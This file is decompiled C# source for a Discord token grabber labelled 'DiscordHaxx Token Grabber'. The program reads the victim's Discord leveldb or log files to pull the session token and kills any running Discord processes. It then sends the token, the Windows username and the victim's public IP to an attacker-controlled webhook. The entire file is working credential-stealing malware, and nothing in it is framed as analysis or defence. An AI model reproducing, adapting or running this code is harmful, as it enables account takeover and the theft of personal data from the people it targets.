using System;
using System.Diagnostics;
using System.Net;
using System.Net.Http;
using System.Threading;

namespace DHTokenGrabber
{
	// Token: 0x02000003 RID: 3
	internal class Program
	{
		// Token: 0x06000006 RID: 6 RVA: 0x00002224 File Offset: 0x00000424
		private static void Main(string[] args)
		{
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";
			if (!Grabber.FindLdb(ref text) && !Grabber.FindLog(ref text))
			{
				Program.SendWH("No valid .ldb or .log file found");
			}
			Process[] processesByName = Process.GetProcessesByName("Discord");
			for (int i = 0; i < processesByName.Length; i++)
			{
				processesByName[i].Kill();
			}
			Thread.Sleep(100);
			string text2 = Grabber.GetToken(text, text.EndsWith(".log"));
			if (text2 == "")
			{
				text2 = "Not found";
			}
			Program.SendWH(text2);
		}

		// Token: 0x06000007 RID: 7 RVA: 0x000022B4 File Offset: 0x000004B4
		private static void SendWH(string token)
		{
			HttpClient httpClient = new HttpClient();
			MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
			multipartFormDataContent.Add(new StringContent("DiscordHaxx Token Grabber"), "username");
			multipartFormDataContent.Add(new StringContent("https://media.discordapp.net/attachments/536613741266075649/539446253730398218/discordhaxx_logo.png?width=300&height=300"), "avatar_url");
			multipartFormDataContent.Add(new StringContent(string.Concat(new string[]
			{
				"Token by ",
				Environment.UserName,
				" on ",
				Program.GetIP(),
				"\r\nResult: ",
				token
			})), "content");
			try
			{
				HttpResponseMessage result = httpClient.PostAsync(Settings.Webhook, multipartFormDataContent).Result;
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000008 RID: 8 RVA: 0x00002368 File Offset: 0x00000568
		private static string GetIP()
		{
			string result;
			try
			{
				result = new HttpClient().GetStringAsync("https://wtfismyip.com/text").Result;
			}
			catch (WebException)
			{
				result = "Unable to get IP";
			}
			return result;
		}
	}
}
